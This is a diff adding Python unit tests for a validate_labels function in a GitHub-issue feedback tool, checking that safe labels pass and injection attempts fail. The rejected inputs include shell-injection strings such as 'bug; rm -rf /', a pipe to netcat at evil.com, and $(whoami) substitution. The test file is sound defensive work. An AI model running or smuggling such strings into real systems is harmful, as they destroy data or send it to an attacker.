@@ -426,6 +426,61 @@ class TestCreateGitHubIssue(unittest.TestCase):
         mock_create.assert_not_called()
 
 
+class TestValidateLabels(unittest.TestCase):
+    """Test validate_labels() function."""
+
+    def test_valid_simple_labels(self):
+        """Test valid simple labels pass validation."""
+        valid, error = feedback.validate_labels(['bug', 'enhancement', 'feedback'])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_valid_labels_with_hyphens_colons_slashes(self):
+        """Test labels with allowed special characters."""
+        valid, error = feedback.validate_labels([
+            'needs-triage', 'type: bug', 'area/core'
+        ])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_invalid_label_shell_metacharacters(self):
+        """Test labels with shell metacharacters are rejected."""
+        for dangerous_label in [
+            'bug; rm -rf /',
+            'label && malicious',
+            'label | nc evil.com',
+            'label$(whoami)',
+            'label`id`',
+        ]:
+            valid, error = feedback.validate_labels([dangerous_label])
+            self.assertFalse(valid, f"Should reject: {dangerous_label}")
+            self.assertIn("Invalid label", error)
+
+    def test_invalid_label_newlines(self):
+        """Test labels with newlines are rejected."""
+        valid, error = feedback.validate_labels(['bug\nmalicious'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_empty_label_rejected(self):
+        """Test empty label string is rejected."""
+        valid, error = feedback.validate_labels([''])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_valid_labels_with_spaces(self):
+        """Test labels with spaces are valid."""
+        valid, error = feedback.validate_labels(['needs review', 'good first issue'])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_mixed_valid_and_invalid_labels(self):
+        """Test that one invalid label fails the whole set."""
+        valid, error = feedback.validate_labels(['bug', 'label;injection'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+
 class TestCheckGhCli(unittest.TestCase):
     """Test check_gh_cli() function."""
 
